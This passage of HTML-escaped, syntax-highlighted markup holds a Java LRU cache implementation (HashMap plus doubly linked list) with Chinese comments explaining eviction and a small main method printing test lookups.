class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } LRU import java.util.HashMap; /** Created by kangkaisen on 16/5/5. */ //实现起来比较简单. 维护一个链表,每次数据新添加或者有访问时移动到链表尾, //每次淘汰数据则是淘汰链表头部的数据. //也就是最近最少访问的数据在链表头部,最近刚访问的数据在链表尾部  public class LRUCache { private class Node{ Node prev; Node next; int key; int value;  &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;();&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @param capacity, an integer&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;LRUCache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// write your code here&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;capacity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @return an integer&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// write your code here&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;containsKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// remove current&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// move current to tail&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;move_to_tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @param key, an integer&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @param value, an integer&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @return nothing&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// write your code here&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capacity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;hs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;move_to_tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;move_to_tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Node&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;LRUCache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;LRUCache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span 